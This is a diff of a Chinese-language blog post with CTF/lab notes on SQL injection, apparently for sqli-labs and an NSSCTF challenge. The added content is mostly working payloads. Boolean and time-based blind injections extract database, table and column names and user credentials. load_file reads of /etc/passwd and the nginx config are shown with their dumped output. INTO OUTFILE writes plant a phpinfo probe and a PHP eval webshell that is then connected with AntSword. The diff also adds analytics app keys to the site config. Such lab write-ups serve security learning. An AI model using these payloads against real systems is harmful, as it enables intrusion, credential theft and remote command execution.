@@ -34,7 +34,7 @@
 <meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202410060259924.png">
 <meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202410060302469.png">
 <meta property="article:published_time" content="2024-10-05T18:34:33.000Z">
-<meta property="article:modified_time" content="2024-10-28T07:36:38.276Z">
+<meta property="article:modified_time" content="2024-11-17T12:29:16.764Z">
 <meta property="article:author" content="fogpost">
 <meta property="article:tag" content="sql">
 <meta name="twitter:card" content="summary_large_image">
@@ -80,7 +80,7 @@
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"fogpost.top","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":true,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+    var CONFIG = {"hostname":"fogpost.top","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":true,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"kbO6chWK2duQGkd1HKIUxBkw-gzGzoHsz","app_key":"SqbgIdLerc0z5X5FoYLqGCtE","server_url":null,"path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
@@ -91,12 +91,26 @@
   <script  src="/js/color-schema.js" ></script>
   
 
+  
 
   
-<meta name="generator" content="Hexo 7.3.0"></head>
+
+  
+
+  
+
+  
+    
+  
 
 
-<body>
+
+  
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="fogpost`s little blog" type="application/atom+xml">
+</head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
   
 
   <header>
@@ -231,7 +245,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          626 字
+          1.8k 字
         
       </span>
     
@@ -242,12 +256,21 @@
         
         
         
-          6 分钟
+          16 分钟
         
       </span>
     
 
     
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
     
   </div>
 
@@ -302,9 +325,32 @@
 <h2 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h2><ol>
 <li>sqlmap -u <a target="_blank" rel="noopener" href="http://sql/sqli-labs-master/Less-1/">http://sql/sqli-labs-master/Less-1/</a> –dbs 查看对应的库</li>
 </ol>
-<h1 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h1><h2 id="手工注入-1"><a href="#手工注入-1" class="headerlink" title="手工注入"></a>手工注入</h2><ol>
-<li>输入?id&#x3D;1’，页面报错，说明存在单引号注入</li>
-</ol>
+<h1 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h1><p>?id&#x3D;1’and length((select database()))&gt;9–+<br>#大于号可以换成小于号或者等于号，主要是判断数据库的长度。lenfth()是获取当前数据库名的长度。如果数据库是haha那么length()就是4<br>?id&#x3D;1’and ascii(substr((select database()),1,1))&#x3D;115–+<br>#substr(“78909”,1,1)&#x3D;7 substr(a,b,c)a是要截取的字符串，b是截取的位置，c是截取的长度。布尔盲注我们都是长度为1因为我们要一个个判断字符。ascii()是将截取的字符转换成对应的ascii吗，这样我们可以很好确定数字根据数字找到对应的字符。</p>
+<p>?id&#x3D;1’and length((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))&gt;13–+<br>判断所有表名字符长度。<br>?id&#x3D;1’and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),1,1))&gt;99–+<br>逐一判断表名</p>
+<p>?id&#x3D;1’and length((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’))&gt;20–+<br>判断所有字段名的长度<br>?id&#x3D;1’and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),1,1))&gt;99–+<br>逐一判断字段名。</p>
+<p>?id&#x3D;1’ and length((select group_concat(username,password) from users))&gt;109–+<br>判断字段内容长度<br>?id&#x3D;1’ and ascii(substr((select group_concat(username,password) from users),1,1))&gt;50–+<br>逐一检测内容。</p>
+<h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><p>?id&#x3D;1’ and if(1&#x3D;1,sleep(5),1)–+<br>判断参数构造。<br>?id&#x3D;1’and if(length((select database()))&gt;9,sleep(5),1)–+<br>判断数据库名长度</p>
+<p>?id&#x3D;1’and if(ascii(substr((select database()),1,1))&#x3D;115,sleep(5),1)–+<br>逐一判断数据库字符<br>?id&#x3D;1’and if(length((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))&gt;13,sleep(5),1)–+<br>判断所有表名长度</p>
+<p>?id&#x3D;1’and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),1,1))&gt;99,sleep(5),1)–+<br>逐一判断表名<br>?id&#x3D;1’and if(length((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’))&gt;20,sleep(5),1)–+<br>判断所有字段名的长度</p>
+<p>?id&#x3D;1’and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),1,1))&gt;99,sleep(5),1)–+<br>逐一判断字段名。<br>?id&#x3D;1’ and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)–+<br>判断字段内容长度</p>
+<p>?id&#x3D;1’ and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)–+<br>逐一检测内容。</p>
+<h1 id="通过sql来getshell"><a href="#通过sql来getshell" class="headerlink" title="通过sql来getshell"></a>通过sql来getshell</h1><h2 id="条件和原理"><a href="#条件和原理" class="headerlink" title="条件和原理"></a>条件和原理</h2><blockquote>
+<p>条件：<br> root权限<br> 知道网站根目录绝对路径<br> secure_file_priv为空或指定目录（@@secure_file_priv参数可以其值）<br> gpc关闭<br>原理：<br> 写入webshell，通过参数执行系统命令，结束后删除webshell<br>附：sqlserver getshell条件和原理<br> 条件：<br>  支持外连<br>  有sa权限<br> 原理：<br>  开启xp_cmd扩展执行系统命令  </p>
+</blockquote>
+<h2 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h2><blockquote>
+<p>?id&#x3D;-1)))))) union select load_file(‘&#x2F;etc&#x2F;passwd’),2%23<br>root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;ash<br>bin:x:1:1:bin:&#x2F;bin:&#x2F;sbin&#x2F;nologin<br>daemon:x:2:2:daemon:&#x2F;sbin:&#x2F;sbin&#x2F;nologin<br>adm:x:3:4:adm:&#x2F;var&#x2F;adm:&#x2F;sbin&#x2F;nologin<br>lp:x:4:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;sbin&#x2F;nologin<br>sync:x:5:0:sync:&#x2F;sbin:&#x2F;bin&#x2F;sync<br>shutdown:x:6:0:shutdown:&#x2F;sbin:&#x2F;sbin&#x2F;shutdown<br>halt:x:7:0:halt:&#x2F;sbin:&#x2F;sbin&#x2F;halt<br>mail:x:8:12:mail:&#x2F;var&#x2F;mail:&#x2F;sbin&#x2F;nologin<br>news:x:9:13:news:&#x2F;usr&#x2F;lib&#x2F;news:&#x2F;sbin&#x2F;nologin<br>uucp:x:10:14:uucp:&#x2F;var&#x2F;spool&#x2F;uucppublic:&#x2F;sbin&#x2F;nologin<br>operator:x:11:0:operator:&#x2F;root:&#x2F;sbin&#x2F;nologin<br>man:x:13:15:man:&#x2F;usr&#x2F;man:&#x2F;sbin&#x2F;nologin<br>postmaster:x:14:12:postmaster:&#x2F;var&#x2F;mail:&#x2F;sbin&#x2F;nologin<br>cron:x:16:16:cron:&#x2F;var&#x2F;spool&#x2F;cron:&#x2F;sbin&#x2F;nologin<br>ftp:x:21:21::&#x2F;var&#x2F;lib&#x2F;ftp:&#x2F;sbin&#x2F;nologin<br>sshd:x:22:22:sshd:&#x2F;dev&#x2F;null:&#x2F;sbin&#x2F;nologin<br>at:x:25:25:at:&#x2F;var&#x2F;spool&#x2F;cron&#x2F;atjobs:&#x2F;sbin&#x2F;nologin<br>squid:x:31:31:Squid:&#x2F;var&#x2F;cache&#x2F;squid:&#x2F;sbin&#x2F;nologin<br>xfs:x:33:33:X Font Server:&#x2F;etc&#x2F;X11&#x2F;fs:&#x2F;sbin&#x2F;nologin<br>games:x:35:35:games:&#x2F;usr&#x2F;games:&#x2F;sbin&#x2F;nologin<br>cyrus:x:85:12::&#x2F;usr&#x2F;cyrus:&#x2F;sbin&#x2F;nologin<br>vpopmail:x:89:89::&#x2F;var&#x2F;vpopmail:&#x2F;sbin&#x2F;nologin<br>ntp:x:123:123:NTP:&#x2F;var&#x2F;empty:&#x2F;sbin&#x2F;nologin<br>smmsp:x:209:209:smmsp:&#x2F;var&#x2F;spool&#x2F;mqueue:&#x2F;sbin&#x2F;nologin<br>guest:x:405:100:guest:&#x2F;dev&#x2F;null:&#x2F;sbin&#x2F;nologin<br>nobody:x:65534:65534:nobody:&#x2F;:&#x2F;sbin&#x2F;nologin<br>www-data:x:82:82:Linux User,,,:&#x2F;home&#x2F;www-data:&#x2F;sbin&#x2F;nologin<br>mysql:x:100:101:mysql:&#x2F;var&#x2F;lib&#x2F;mysql:&#x2F;sbin&#x2F;nologin<br>nginx:x:101:102:nginx:&#x2F;var&#x2F;lib&#x2F;nginx:&#x2F;sbin&#x2F;nologin</p>
+</blockquote>
+<h2 id="读取nginx配置文件，寻找网站根目录"><a href="#读取nginx配置文件，寻找网站根目录" class="headerlink" title="读取nginx配置文件，寻找网站根目录"></a>读取nginx配置文件，寻找网站根目录</h2><blockquote>
+<p>?id&#x3D;-1)))))) union select load_file(‘&#x2F;etc&#x2F;nginx&#x2F;nginx.conf’),2%23<br>Array ( [0] &#x3D;&gt; Array ( [username] &#x3D;&gt; daemon off; worker_processes auto; error_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log warn; events { worker_connections 1024; } http { include &#x2F;etc&#x2F;nginx&#x2F;mime.types; default_type application&#x2F;octet-stream; sendfile on; keepalive_timeout 65; server { listen 80; server_name localhost; root &#x2F;var&#x2F;www&#x2F;html; index index.php; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; location &#x2F; { try_files $uri $uri&#x2F; &#x2F;index.php?$args; } location ~ .php$ { try_files $uri &#x3D;404; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; include fastcgi_params; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; } } } [password] &#x3D;&gt; 2 ) )</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">Array</span><br>(<br>    [<span class="hljs-number">0</span>] =&gt; <span class="hljs-title function_ invoke__">Array</span><br>        (<br>            [username] =&gt; daemon off;<br><br>worker_processes  auto;<br><br>error_log  /<span class="hljs-keyword">var</span>/log/nginx/error.log warn;<br><br>events &#123;<br>    worker_connections  <span class="hljs-number">1024</span>;<br>&#125;<br><br>http &#123;<br>    <span class="hljs-keyword">include</span>       /etc/nginx/mime.types;<br>    default_type  application/octet-stream;<br>    sendfile        on;<br>    keepalive_timeout  <span class="hljs-number">65</span>;<br><br>    server &#123;<br>        listen       <span class="hljs-number">80</span>;<br>        server_name  localhost;<br>        root         /<span class="hljs-keyword">var</span>/www/html;<br>        index index.php;<br><br>        proxy_set_header Host <span class="hljs-variable">$host</span>;<br>        proxy_set_header X-Real-IP <span class="hljs-variable">$remote_addr</span>;<br>        proxy_set_header X-Forwarded-For <span class="hljs-variable">$proxy_add_x_forwarded_for</span>;<br><br>        location / &#123;<br>            try_files <span class="hljs-variable">$uri</span>  <span class="hljs-variable">$uri</span>/ /index.php?<span class="hljs-variable">$args</span>;<br>        &#125;<br><br>        location ~ \.php$ &#123;<br>            try_files <span class="hljs-variable">$uri</span> =<span class="hljs-number">404</span>;<br>            fastcgi_pass   <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">9000</span>;<br>            fastcgi_index  index.php;<br>            <span class="hljs-keyword">include</span>        fastcgi_params;<br>            fastcgi_param  SCRIPT_FILENAME  <span class="hljs-variable">$document</span>_root<span class="hljs-variable">$fastcgi_script_name</span>;<br>        &#125;<br><br>    &#125;<br>&#125;<br>            [password] =&gt; <span class="hljs-number">2</span><br>        )<br><br>)<br></code></pre></td></tr></table></figure>
+
+<h2 id="写入php探针"><a href="#写入php探针" class="headerlink" title="写入php探针:"></a>写入php探针:</h2><blockquote>
+<p>?id&#x3D;-1)))))) union select ‘<?php phpinfo();?>‘,2 into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;info.php’%23<br><a target="_blank" rel="noopener" href="http://node6.anna.nssctf.cn:28413/info.php">http://node6.anna.nssctf.cn:28413/info.php</a></p>
+</blockquote>
+<h2 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h2><blockquote>
+<p>?id&#x3D;-1)))))) union select ‘<?php eval($_POST["cc"]);?>‘,2 into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;cc.php’%23<br>蚁剑连接：<a target="_blank" rel="noopener" href="http://node6.anna.nssctf.cn:28413/cc.php">http://node6.anna.nssctf.cn:28413/cc.php</a> 密码cc</p>
+</blockquote>
 
                 
               </div>
@@ -575,6 +621,32 @@
     </div>
   
   
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
   
 </div>
 
@@ -720,6 +792,8 @@
 
   <script>Fluid.plugins.imageCaption();</script>
 
+  <script defer src="/js/leancloud.js" ></script>
+
   <script  src="/js/local-search.js" ></script>
 
 
@@ -736,5 +810,5 @@
   <noscript>
     <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
   </noscript>
-</body>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
 </html>
